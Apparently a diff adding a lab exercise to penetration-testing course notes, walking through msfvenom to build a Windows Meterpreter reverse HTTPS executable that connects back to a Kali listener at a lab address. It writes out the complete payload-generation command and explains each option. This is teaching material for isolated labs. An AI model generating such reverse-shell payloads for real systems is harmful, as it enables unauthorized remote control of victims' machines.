@@ -1915,3 +1915,286 @@ PLATFORM / TYPE / COMMUNICATION
 In the next lab, we can take this understanding and put it into practice by selecting an appropriate Windows payload, examining its options, and testing it only between your Kali and Windows lab VMs.
 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+ Exercise: Creating a Windows Reverse HTTPS Payload with MSFvenom
+
+> Lab environment: Kali Linux + your own Windows VM.
+> Objective: Generate a Windows reverse HTTPS executable in your isolated lab and understand every option used.
+
+---
+
+ 1. Open MSFvenom Help
+
+Start by checking the available MSFvenom options:
+
+```bash
+msfvenom --help
+```
+
+This displays the available arguments and options.
+
+<img width="1440" height="594" alt="Screenshot 2026-08-10 at 3 23 41 PM" src="https://github.com/user-attachments/assets/4d6a2c40-1b92-4b9d-b9f1-ba85be8dbd87" />
+
+
+---
+
+ 2. List Available Payloads
+
+Before selecting a payload, list the available payloads:
+
+```bash
+msfvenom --list payloads
+```
+
+This produces a large list of available payloads.
+
+<img width="1440" height="673" alt="Screenshot 2026-08-10 at 3 23 52 PM" src="https://github.com/user-attachments/assets/2364f32b-dd57-41bd-8bb7-d5bb786b77d9" />
+
+
+---
+
+ 3. Select the Windows Meterpreter Reverse HTTPS Payload
+
+For this lab, we select:
+
+```text
+windows/meterpreter/reverse_https
+```
+
+Breakdown:
+
+```text
+windows
+   ↓
+Target platform
+
+meterpreter
+   ↓
+Payload type
+
+reverse_https
+   ↓
+Reverse connection over HTTPS
+```
+
+The payload is designed for a Windows lab machine and uses a reverse HTTPS communication mechanism.
+
+---
+
+ 4. Check the Payload Options
+
+Before generating anything, inspect the options required by the selected payload:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_https --list-options
+```
+
+
+
+Among the important options are:
+
+```text
+LHOST
+LPORT
+```
+
+ LHOST
+
+`LHOST` is the address of the machine that will receive the connection.
+
+In our lab:
+
+```text
+Kali Linux
+     ↑
+     |
+     | reverse connection
+     |
+Windows VM
+```
+
+ LPORT
+
+`LPORT` is the port on which the receiving side will listen.
+
+For this exercise, we use:
+
+```text
+8080
+```
+
+---
+
+ 5. Find the Kali Linux IP Address
+
+Open another terminal:
+
+```bash
+ifconfig
+```
+
+or, on modern Kali installations:
+
+```bash
+ip addr
+```
+
+Find the IP address of the Kali interface that can communicate with your Windows VM.
+
+For example:
+
+```text
+192.168.0.26
+```
+
+Your address may be different.
+
+
+
+> Use the IP address belonging to your isolated lab network, not an example address from the lecture.
+
+---
+
+ 6. Generate the Windows Executable
+
+Now we combine everything.
+
+The command structure is:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=<KALI_IP> LPORT=8080 -f exe -o rev_https_at_80.exe
+```
+
+For example, if your Kali lab IP is `192.168.0.26`:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.26 LPORT=8080 -f exe -o rev_https_at_80.exe
+```
+
+ Command breakdown
+
+```text
+msfvenom
+    ↓
+Payload generation tool
+
+-p
+    ↓
+Select payload
+
+windows/meterpreter/reverse_https
+    ↓
+Windows + Meterpreter + reverse HTTPS
+
+LHOST=192.168.0.26
+    ↓
+Kali listener address
+
+LPORT=8080
+    ↓
+Kali listening port
+
+-f exe
+    ↓
+Generate Windows executable format
+
+-o rev_https_at_80.exe
+    ↓
+Save the generated file with this name
+```
+
+<img width="1440" height="286" alt="Screenshot 2026-08-10 at 3 24 02 PM" src="https://github.com/user-attachments/assets/92f4276b-984b-4cea-9e70-d544a22ffbfe" />
+
+
+---
+
+ 7. Verify the Generated File
+
+Check your current directory:
+
+```bash
+pwd
+```
+
+Then:
+
+```bash
+ls -lh
+```
+
+You should see:
+
+```text
+rev_https_at_80.exe
+```
+
+
+---
+
+ 8. Understand What We Have Created
+
+At this stage, we have generated the executable, but simply generating the file does not mean that we automatically have a session.
+
+The overall lab flow is:
+
+```text
+             KALI LINUX
+        ┌─────────────────┐
+        │   MSFvenom      │
+        │                 │
+        │ Generate EXE    │
+        └────────┬────────┘
+                 │
+                 │ lab executable
+                 ↓
+        ┌─────────────────┐
+        │   WINDOWS VM    │
+        │                 │
+        │ Execute EXE     │
+        └────────┬────────┘
+                 │
+                 │ Reverse HTTPS
+                 ↓
+        ┌─────────────────┐
+        │   KALI LINUX    │
+        │                 │
+        │   Listener      │
+        └─────────────────┘
+```
+
+The next stage of the lab is therefore to configure the authorized Metasploit listener and test the executable between your Kali and Windows VMs.
+
+---
+
+ Key Takeaways
+
+ `msfvenom --help` → displays MSFvenom options.
+ `msfvenom --list payloads` → lists available payloads.
+ `-p` → selects the payload.
+ `windows/meterpreter/reverse_https` → Windows Meterpreter reverse HTTPS payload.
+ `LHOST` → receiving/listener address.
+ `LPORT` → receiving/listener port.
+ `-f exe` → generates a Windows executable.
+ `-o` → specifies the output filename.
+ `ls -lh` → verifies that the executable was created.
+
+
+ Lab Result
+
+Successfully generated:
+
+```text
+rev_https_at_80.exe
+```
+
+Platform: Windows
+Payload: Meterpreter
+Connection: Reverse HTTPS
+Listener address: Your Kali lab IP
+Listener port: 8080
+
+This completes the payload-generation portion of the exercise.
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
